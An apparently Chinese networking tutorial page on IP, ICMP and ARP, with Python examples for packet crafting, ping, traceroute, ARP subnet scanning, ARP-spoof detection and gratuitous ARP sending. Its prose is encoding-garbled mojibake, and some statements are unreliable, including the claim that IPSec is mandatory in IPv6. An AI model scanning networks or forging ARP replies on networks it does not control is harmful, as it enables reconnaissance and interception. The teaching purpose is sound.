<pre><code>Aç±»: 10.0.0.0    - 10.255.255.255    (10.0.0.0/8)
Bç±»: 172.16.0.0  - 172.31.255.255    (172.16.0.0/12)
Cç±»: 192.168.0.0 - 192.168.255.255   (192.168.0.0/16)
</code></pre>
<h4 id="ipv6æ•°æ®åŒ…ç»“æ„"><a class="header" href="#ipv6æ•°æ®åŒ…ç»“æ„">IPv6æ•°æ®åŒ…ç»“æ„</a></h4>
<pre><code> 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
â”Œâ”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚Versionâ”‚Traffic Class  â”‚          Flow Label                   â”‚
â”‚4 bits â”‚   8 bits      â”‚           20 bits                     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚        Payload Length                 â”‚   Next Header â”‚Hop Limitâ”‚
â”‚             16 bits                   â”‚    8 bits     â”‚ 8 bits â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                â”‚
â”‚                   Source IPv6 Address                          â”‚
â”‚                        128 bits                                â”‚
â”‚                                                                â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                â”‚
â”‚                Destination IPv6 Address                        â”‚
â”‚                        128 bits                                â”‚
â”‚                                                                â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>IPv6ç‰¹ç‚¹</strong>:</p>
<ul>
<li><strong>åœ°å€ç©ºé—´</strong>: 128ä½ (2^128ä¸ªåœ°å€)</li>
<li><strong>ç®€åŒ–å¤´éƒ¨</strong>: å›ºå®š40å­—èŠ‚</li>
<li><strong>å–æ¶ˆæ ¡éªŒå’Œ</strong>: ç”±ä¸Šå±‚åè®®è´Ÿè´£</li>
<li><strong>å†…ç½®å®‰å…¨</strong>: IPSecæ˜¯å¼ºåˆ¶çš„</li>
<li><strong>è‡ªåŠ¨é…ç½®</strong>: SLAAC (æ— çŠ¶æ€åœ°å€è‡ªåŠ¨é…ç½®)</li>
</ul>
<p><strong>IPv6åœ°å€è¡¨ç¤º</strong>:</p>
<pre><code>å®Œæ•´æ ¼å¼: 2001:0db8:85a3:0000:0000:8a2e:0370:7334
å‹ç¼©æ ¼å¼: 2001:db8:85a3::8a2e:370:7334  (è¿ç»­çš„0å¯çœç•¥)

ç‰¹æ®Šåœ°å€:
::1                 # æœ¬åœ°å›ç¯åœ°å€ (ç­‰åŒäºIPv4çš„127.0.0.1)
::                  # æœªæŒ‡å®šåœ°å€
fe80::/10           # é“¾è·¯æœ¬åœ°åœ°å€
ff00::/8            # ç»„æ’­åœ°å€
</code></pre>
<p><strong>å®æˆ˜ç¤ºä¾‹ï¼šæ„é€ å’Œè§£æIPæ•°æ®åŒ…</strong></p>
<pre><code class="language-python">from scapy.all import IP, TCP, send, sniff

# æ„é€ IPv4æ•°æ®åŒ…
ip_packet = IP(dst="192.168.1.1", ttl=64) / TCP(dport=80)
ip_packet.show()

# å‘é€æ•°æ®åŒ…
send(ip_packet)

# è§£æIPæ•°æ®åŒ…
def analyze_ip_packet(packet):
    if packet.haslayer(IP):
        ip_layer = packet[IP]
        print(f"æºIP: {ip_layer.src}")
        print(f"ç›®æ ‡IP: {ip_layer.dst}")
        print(f"TTL: {ip_layer.ttl}")
        print(f"åè®®: {ip_layer.proto}")
        print(f"æ€»é•¿åº¦: {ip_layer.len}")

        # æ£€æŸ¥åˆ†ç‰‡
        if ip_layer.flags.MF or ip_layer.frag &gt; 0:
            print(f"åˆ†ç‰‡: Offset={ip_layer.frag}, MF={ip_layer.flags.MF}")

# æŠ“åŒ…åˆ†æ
sniff(filter="ip", prn=analyze_ip_packet, count=5)
</code></pre>
<h3 id="42-icmp-internet-control-message-protocol-åè®®"><a class="header" href="#42-icmp-internet-control-message-protocol-åè®®">4.2 ICMP (Internet Control Message Protocol) åè®®</a></h3>
<h4 id="icmpæŠ¥æ–‡ç»“æ„"><a class="header" href="#icmpæŠ¥æ–‡ç»“æ„">ICMPæŠ¥æ–‡ç»“æ„</a></h4>
<pre><code> 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚      Type         â”‚       Code        â”‚      Checksum         â”‚
â”‚     8 bits        â”‚      8 bits       â”‚       16 bits         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                  Rest of Header                               â”‚
â”‚                    (varies)                                   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                     Data                                      â”‚
â”‚           (åŸå§‹IPå¤´éƒ¨ + å‰8å­—èŠ‚æ•°æ®)                           â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 id="icmpæ¶ˆæ¯ç±»å‹"><a class="header" href="#icmpæ¶ˆæ¯ç±»å‹">ICMPæ¶ˆæ¯ç±»å‹</a></h4>
<div class="table-wrapper"><table><thead><tr><th>Type</th><th>Code</th><th>æè¿°</th><th>ç”¨é€”</th></tr></thead><tbody>
<tr><td><strong>0</strong></td><td>0</td><td>Echo Reply (å›æ˜¾åº”ç­”)</td><td>pingå“åº”</td></tr>
<tr><td><strong>3</strong></td><td>0-15</td><td>Destination Unreachable</td><td>ç›®æ ‡ä¸å¯è¾¾</td></tr>
<tr><td></td><td>0</td><td>Network Unreachable</td><td>ç½‘ç»œä¸å¯è¾¾</td></tr>
<tr><td></td><td>1</td><td>Host Unreachable</td><td>ä¸»æœºä¸å¯è¾¾</td></tr>
<tr><td></td><td>2</td><td>Protocol Unreachable</td><td>åè®®ä¸å¯è¾¾</td></tr>
<tr><td></td><td>3</td><td>Port Unreachable</td><td>ç«¯å£ä¸å¯è¾¾</td></tr>
<tr><td></td><td>4</td><td>Fragmentation Needed</td><td>éœ€è¦åˆ†ç‰‡ä½†è®¾ç½®äº†DF</td></tr>
<tr><td><strong>5</strong></td><td>0-3</td><td>Redirect</td><td>é‡å®šå‘</td></tr>
<tr><td><strong>8</strong></td><td>0</td><td>Echo Request (å›æ˜¾è¯·æ±‚)</td><td>pingè¯·æ±‚</td></tr>
<tr><td><strong>11</strong></td><td>0</td><td>Time Exceeded (TTLè¶…æ—¶)</td><td>traceroute</td></tr>
<tr><td></td><td>1</td><td>Fragment Reassembly Time Exceeded</td><td>åˆ†ç‰‡é‡ç»„è¶…æ—¶</td></tr>
</tbody></table>
</div>
<h4 id="pingåŸç†ä¸å®ç°"><a class="header" href="#pingåŸç†ä¸å®ç°">PingåŸç†ä¸å®ç°</a></h4>
<p><strong>Pingäº¤äº’è¿‡ç¨‹</strong>:</p>
<pre><code>å®¢æˆ·ç«¯                                   ç›®æ ‡ä¸»æœº
   â”‚                                        â”‚
   â”‚â”€â”€â”€â”€â”€â”€ Echo Request (Type 8) â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚
   â”‚  ID: 12345, Seq: 1                    â”‚
   â”‚  Data: 32 bytes                        â”‚
   â”‚                                        â”‚
   â”‚â†â”€â”€â”€â”€â”€ Echo Reply (Type 0) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚
   â”‚  ID: 12345, Seq: 1                    â”‚
   â”‚  Data: 32 bytes (å›æ˜¾)                 â”‚
   â”‚                                        â”‚
   â”‚â”€â”€â”€â”€â”€â”€ Echo Request (Type 8) â”€â”€â”€â”€â”€â”€â”€â”€â”€â†’â”‚
   â”‚  ID: 12345, Seq: 2                    â”‚
   â”‚                                        â”‚
   â”‚â†â”€â”€â”€â”€â”€ Echo Reply (Type 0) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”‚
   â”‚  ID: 12345, Seq: 2                    â”‚
   â”‚                                        â”‚
</code></pre>
<p><strong>Echo Request/ReplyæŠ¥æ–‡æ ¼å¼</strong>:</p>
<pre><code> 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Type (8 or 0)    â”‚    Code (0)       â”‚      Checksum         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚          Identifier                   â”‚   Sequence Number     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                         Data                                  â”‚
â”‚                    (å¯é€‰ï¼Œé€šå¸¸32å­—èŠ‚)                          â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>å®æˆ˜ç¤ºä¾‹ï¼šå®ç°Ping</strong></p>
<pre><code class="language-python">import socket
import struct
import time
import os

def checksum(data):
    """è®¡ç®—æ ¡éªŒå’Œ"""
    s = 0
    n = len(data) % 2
    for i in range(0, len(data) - n, 2):
        s += (data[i] &lt;&lt; 8) + data[i + 1]
    if n:
        s += data[-1] &lt;&lt; 8
    while s &gt;&gt; 16:
        s = (s &amp; 0xFFFF) + (s &gt;&gt; 16)
    return ~s &amp; 0xFFFF

def create_ping_packet(seq_num):
    """åˆ›å»ºICMP Echo Requestæ•°æ®åŒ…"""
    # ICMPå¤´éƒ¨
    icmp_type = 8  # Echo Request
    icmp_code = 0
    icmp_checksum = 0
    icmp_id = os.getpid() &amp; 0xFFFF
    icmp_seq = seq_num

    # æ•°æ®éƒ¨åˆ†
    data = b'abcdefghijklmnopqrstuvwxyz123456'  # 32å­—èŠ‚

    # æ„é€ å¤´éƒ¨ï¼ˆæ ¡éªŒå’Œå…ˆå¡«0ï¼‰
    header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum,
                         icmp_id, icmp_seq)

    # è®¡ç®—æ ¡éªŒå’Œ
    icmp_checksum = checksum(header + data)

    # é‡æ–°æ„é€ å¤´éƒ¨ï¼ˆå¡«å…¥æ­£ç¡®çš„æ ¡éªŒå’Œï¼‰
    header = struct.pack('!BBHHH', icmp_type, icmp_code,
                         socket.htons(icmp_checksum), icmp_id, icmp_seq)

    return header + data

def ping(host, count=4):
    """å‘é€pingè¯·æ±‚"""
    # åˆ›å»ºåŸå§‹å¥—æ¥å­—
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                         socket.IPPROTO_ICMP)
    sock.settimeout(2)

    try:
        dest_addr = socket.gethostbyname(host)
        print(f"æ­£åœ¨ Ping {host} [{dest_addr}] å…·æœ‰ 32 å­—èŠ‚çš„æ•°æ®:\n")

        for seq in range(1, count + 1):
            # å‘é€Echo Request
            packet = create_ping_packet(seq)
            send_time = time.time()
            sock.sendto(packet, (dest_addr, 0))

            try:
                # æ¥æ”¶Echo Reply
                data, addr = sock.recvfrom(1024)
                recv_time = time.time()

                # è§£æIPå¤´éƒ¨
                ip_header = data[:20]
                iph = struct.unpack('!BBHHHBBH4s4s', ip_header)
                ttl = iph[5]

                # è§£æICMPå¤´éƒ¨
                icmp_header = data[20:28]
                icmp_type, code, checksum, p_id, p_seq = struct.unpack(
                    '!BBHHH', icmp_header
                )

                if icmp_type == 0:  # Echo Reply
                    rtt = (recv_time - send_time) * 1000
                    print(f"æ¥è‡ª {addr[0]} çš„å›å¤: å­—èŠ‚=32 æ—¶é—´={rtt:.0f}ms TTL={ttl}")
                else:
                    print(f"æ”¶åˆ° ICMP Type={icmp_type}, Code={code}")

            except socket.timeout:
                print("è¯·æ±‚è¶…æ—¶ã€‚")

            time.sleep(1)

    finally:
        sock.close()

# ä½¿ç”¨ç¤ºä¾‹
if __name__ == "__main__":
    ping("www.baidu.com", count=4)
</code></pre>
<h4 id="tracerouteåŸç†"><a class="header" href="#tracerouteåŸç†">TracerouteåŸç†</a></h4>
<p><strong>Tracerouteå·¥ä½œåŸç†</strong>:</p>
<pre><code>åˆ©ç”¨IPæ•°æ®åŒ…çš„TTLå­—æ®µï¼š

æ­¥éª¤1: å‘é€TTL=1çš„æ•°æ®åŒ…
   å®¢æˆ·ç«¯ â”€â”€â”€[TTL=1]â”€â”€â”€&gt; è·¯ç”±å™¨1 â”€â”€â”€[ICMP Time Exceeded]â”€â”€â”€&gt; å®¢æˆ·ç«¯

æ­¥éª¤2: å‘é€TTL=2çš„æ•°æ®åŒ…
   å®¢æˆ·ç«¯ â”€â”€â”€[TTL=1]â”€â”€â”€&gt; è·¯ç”±å™¨1 â”€â”€â”€[TTL=1]â”€â”€â”€&gt; è·¯ç”±å™¨2 â”€â”€â”€[ICMP Time Exceeded]â”€â”€â”€&gt; å®¢æˆ·ç«¯

æ­¥éª¤3: å‘é€TTL=3çš„æ•°æ®åŒ…
   å®¢æˆ·ç«¯ â”€â”€â”€[TTL=1]â”€â”€â”€&gt; è·¯ç”±å™¨1 â”€â”€â”€[TTL=1]â”€â”€â”€&gt; è·¯ç”±å™¨2 â”€â”€â”€[TTL=1]â”€â”€â”€&gt; ç›®æ ‡ä¸»æœº

...ä¾æ­¤ç±»æ¨ï¼Œç›´åˆ°åˆ°è¾¾ç›®æ ‡
</code></pre>
<p><strong>å®æˆ˜ç¤ºä¾‹ï¼šå®ç°Traceroute</strong></p>
<pre><code class="language-python">import socket
import struct
import time

def traceroute(dest_name, max_hops=30):
    """è¿½è¸ªè·¯ç”±è·¯å¾„"""
    dest_addr = socket.gethostbyname(dest_name)
    print(f"è¿½è¸ªåˆ° {dest_name} [{dest_addr}] çš„è·¯ç”±ï¼Œæœ€å¤š {max_hops} ä¸ªè·ƒç‚¹:\n")

    # åˆ›å»ºUDPå¥—æ¥å­—å‘é€ï¼ŒICMPå¥—æ¥å­—æ¥æ”¶
    send_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM,
                               socket.IPPROTO_UDP)
    recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                               socket.IPPROTO_ICMP)
    recv_sock.settimeout(2)

    port = 33434  # tracerouteä½¿ç”¨çš„ç«¯å£

    for ttl in range(1, max_hops + 1):
        send_sock.setsockopt(socket.SOL_IP, socket.IP_TTL, ttl)

        # å‘é€3ä¸ªæ¢æµ‹åŒ…
        recv_addr = None
        times = []

        for _ in range(3):
            send_time = time.time()
            send_sock.sendto(b'', (dest_addr, port))

            try:
                data, addr = recv_sock.recvfrom(512)
                recv_time = time.time()
                rtt = (recv_time - send_time) * 1000
                times.append(rtt)
                recv_addr = addr[0]
            except socket.timeout:
                times.append(None)

        # è¾“å‡ºç»“æœ
        if recv_addr:
            try:
                hostname = socket.gethostbyaddr(recv_addr)[0]
            except:
                hostname = recv_addr

            time_str = ' '.join([f'{t:.0f} ms' if t else '*' for t in times])
            print(f"{ttl:2d}  {time_str}  {hostname} [{recv_addr}]")

            if recv_addr == dest_addr:
                print("\nè¿½è¸ªå®Œæˆã€‚")
                break
        else:
            print(f"{ttl:2d}  * * *  è¯·æ±‚è¶…æ—¶ã€‚")

    send_sock.close()
    recv_sock.close()

# ä½¿ç”¨ç¤ºä¾‹
if __name__ == "__main__":
    traceroute("www.google.com")
</code></pre>
<h3 id="43-arp-address-resolution-protocol-åè®®"><a class="header" href="#43-arp-address-resolution-protocol-åè®®">4.3 ARP (Address Resolution Protocol) åè®®</a></h3>
<h4 id="arpå·¥ä½œåŸç†"><a class="header" href="#arpå·¥ä½œåŸç†">ARPå·¥ä½œåŸç†</a></h4>
<p><strong>ARPçš„ä½œç”¨</strong>: å°†IPåœ°å€è§£æä¸ºMACåœ°å€</p>
<pre><code>åœºæ™¯: ä¸»æœºA (192.168.1.10) è¦å‘é€æ•°æ®ç»™ä¸»æœºB (192.168.1.20)

æ­¥éª¤1: ä¸»æœºAå¹¿æ’­ARPè¯·æ±‚
   A: "è°æ˜¯ 192.168.1.20ï¼Ÿè¯·å‘Šè¯‰ 192.168.1.10 (MAC: AA:AA:AA:AA:AA:AA)"
   â†“ (å¹¿æ’­åˆ°æ‰€æœ‰ä¸»æœº)

æ­¥éª¤2: ä¸»æœºBå•æ’­ARPåº”ç­”
   B: "æˆ‘æ˜¯ 192.168.1.20ï¼Œæˆ‘çš„MACåœ°å€æ˜¯ BB:BB:BB:BB:BB:BB"
   â†’ (ç›´æ¥å‘é€ç»™A)

æ­¥éª¤3: ä¸»æœºAç¼“å­˜ARPæ¡ç›®
   A: 192.168.1.20 â†’ BB:BB:BB:BB:BB:BB (ç¼“å­˜)
</code></pre>
<h4 id="arpæŠ¥æ–‡æ ¼å¼"><a class="header" href="#arpæŠ¥æ–‡æ ¼å¼">ARPæŠ¥æ–‡æ ¼å¼</a></h4>
<pre><code> 0                   1                   2                   3
 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    Hardware Type (HTYPE)      â”‚    Protocol Type (PTYPE)      â”‚
â”‚         (1 = Ethernet)        â”‚        (0x0800 = IPv4)        â”‚
â”‚          16 bits              â”‚           16 bits             â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  Hardware     â”‚  Protocol     â”‚         Operation             â”‚
â”‚Address Length â”‚Address Length â”‚  (1=Request, 2=Reply)         â”‚
â”‚(HLEN=6 bytes) â”‚(PLEN=4 bytes) â”‚         16 bits               â”‚
â”‚    8 bits     â”‚    8 bits     â”‚                               â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚               Sender Hardware Address (SHA)                   â”‚
â”‚                  (MACåœ°å€ï¼Œ6å­—èŠ‚)                              â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚          Sender Protocol Address (SPA)                        â”‚
â”‚               (IPåœ°å€ï¼Œ4å­—èŠ‚)                                  â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚               Target Hardware Address (THA)                   â”‚
â”‚         (ç›®æ ‡MACåœ°å€ï¼Œè¯·æ±‚æ—¶ä¸º0ï¼Œ6å­—èŠ‚)                         â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚          Target Protocol Address (TPA)                        â”‚
â”‚               (ç›®æ ‡IPåœ°å€ï¼Œ4å­—èŠ‚)                              â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>å­—æ®µè¯´æ˜</strong>:</p>
<ul>
<li><strong>Hardware Type</strong>: ç¡¬ä»¶ç±»å‹ (1 = Ethernet)</li>
<li><strong>Protocol Type</strong>: åè®®ç±»å‹ (0x0800 = IPv4)</li>
<li><strong>HLEN</strong>: ç¡¬ä»¶åœ°å€é•¿åº¦ (6å­—èŠ‚for MAC)</li>
<li><strong>PLEN</strong>: åè®®åœ°å€é•¿åº¦ (4å­—èŠ‚for IPv4)</li>
<li><strong>Operation</strong>: æ“ä½œç±»å‹
<ul>
<li>1 = ARP Request (è¯·æ±‚)</li>
<li>2 = ARP Reply (åº”ç­”)</li>
<li>3 = RARP Request</li>
<li>4 = RARP Reply</li>
</ul>
</li>
</ul>
<p><strong>å®æˆ˜ç¤ºä¾‹ï¼šARPæ¬ºéª—æ£€æµ‹ä¸é˜²å¾¡</strong></p>
<pre><code class="language-python">from scapy.all import ARP, Ether, srp, sniff
import time

class ARPMonitor:
    """ARPç›‘æ§å™¨ - æ£€æµ‹ARPæ¬ºéª—"""

    def __init__(self, interface='eth0'):
        self.interface = interface
        self.arp_table = {}  # IP -&gt; MAC æ˜ å°„è¡¨

    def get_mac(self, ip):
        """è·å–IPå¯¹åº”çš„MACåœ°å€"""
        arp = ARP(pdst=ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp

        result = srp(packet, timeout=2, verbose=0)[0]

        if result:
            return result[0][1].hwsrc
        return None

    def scan_network(self, ip_range):
        """æ‰«æç½‘ç»œä¸­çš„æ‰€æœ‰ä¸»æœº"""
        print(f"æ­£åœ¨æ‰«æç½‘ç»œ {ip_range}...")

        arp = ARP(pdst=ip_range)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp

        result = srp(packet, timeout=3, verbose=0)[0]

        clients = []
        for sent, received in result:
            clients.append({'ip': received.psrc, 'mac': received.hwsrc})
            self.arp_table[received.psrc] = received.hwsrc

        return clients

    def detect_arp_spoof(self, packet):
        """æ£€æµ‹ARPæ¬ºéª—"""
        if packet.haslayer(ARP) and packet[ARP].op == 2:  # ARP Reply
            try:
                real_mac = self.arp_table.get(packet[ARP].psrc)
                response_mac = packet[ARP].hwsrc

                if real_mac and real_mac != response_mac:
                    print(f"\n[!] æ£€æµ‹åˆ°ARPæ¬ºéª—æ”»å‡»!")
                    print(f"    IP: {packet[ARP].psrc}")
                    print(f"    çœŸå®MAC: {real_mac}")
                    print(f"    ä¼ªé€ MAC: {response_mac}")
                    return True
                else:
                    # æ›´æ–°ARPè¡¨
                    self.arp_table[packet[ARP].psrc] = response_mac

            except KeyError:
                pass

        return False

    def start_monitoring(self):
        """å¼€å§‹ç›‘æ§ARPæµé‡"""
        print(f"å¼€å§‹ç›‘æ§ {self.interface} ä¸Šçš„ARPæµé‡...")
        print("æŒ‰ Ctrl+C åœæ­¢ç›‘æ§\n")

        sniff(filter="arp", prn=self.detect_arp_spoof,
              iface=self.interface, store=0)

# ä½¿ç”¨ç¤ºä¾‹
if __name__ == "__main__":
    monitor = ARPMonitor(interface='eth0')

    # æ‰«æç½‘ç»œ
    clients = monitor.scan_network("192.168.1.0/24")
    print("\nå‘ç°çš„ä¸»æœº:")
    for client in clients:
        print(f"  IP: {client['ip']:15s}  MAC: {client['mac']}")

    print()
    # å¼€å§‹ç›‘æ§
    monitor.start_monitoring()
</code></pre>
<p><strong>ARPç¼“å­˜æ“ä½œ</strong>:</p>
<pre><code class="language-bash"># LinuxæŸ¥çœ‹ARPç¼“å­˜
arp -n

# WindowsæŸ¥çœ‹ARPç¼“å­˜
arp -a

# æ·»åŠ é™æ€ARPæ¡ç›®ï¼ˆé˜²æ­¢ARPæ¬ºéª—ï¼‰
sudo arp -s 192.168.1.1 00:11:22:33:44:55

# åˆ é™¤ARPæ¡ç›®
sudo arp -d 192.168.1.1

# æ¸…ç©ºARPç¼“å­˜
sudo ip -s -s neigh flush all
</code></pre>
<p><strong>å…è´¹ARP (Gratuitous ARP)</strong>:</p>
<pre><code>ä½œç”¨:
1. å®£å‘Šè‡ªå·±çš„IPåœ°å€ï¼Œæ£€æµ‹IPå†²çª
2. æ›´æ–°å…¶ä»–ä¸»æœºçš„ARPç¼“å­˜
3. ç”¨äºä¸»å¤‡åˆ‡æ¢ï¼ˆå¦‚VRRPï¼‰

ç‰¹ç‚¹:
- å‘é€è€…IP = ç›®æ ‡IP
- é€šå¸¸åœ¨ç½‘å¡å¯åŠ¨æ—¶å‘é€
</code></pre>
<pre><code class="language-python">from scapy.all import ARP, Ether, sendp

def send_gratuitous_arp(interface, ip, mac):
    """å‘é€å…è´¹ARP"""
    arp = ARP(op=2,  # ARP Reply
              psrc=ip,
              pdst=ip,  # ç›®æ ‡IPç­‰äºæºIP
